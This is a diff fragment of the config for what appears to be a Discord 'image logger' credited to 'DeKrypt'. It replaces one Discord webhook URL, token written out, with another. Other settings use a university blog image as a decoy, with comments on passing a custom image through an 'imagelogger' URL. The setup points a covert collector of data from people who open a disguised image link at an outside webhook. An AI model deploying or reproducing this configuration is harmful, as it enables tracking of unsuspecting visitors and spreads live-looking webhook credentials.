@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1343771343837073510/sSxC2EDpK4e5mSjlwFNPW_h6nmuGCAqok-jSofkEiyLRBUGb7eW0ZO4mjxO2Qf7WGy-F",
+    "webhook": "https://discord.com/api/webhooks/1343828797186900058/bG_1pHnmlTH9CKdasM6LYRZauvEqqPC_2s5dZx-M4k39lOUtRi6GRmRAAvhFTuKKlK6S",
     "image": "https://www.bu.edu/files/2024/08/Hey-BU-Blog-Headers.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
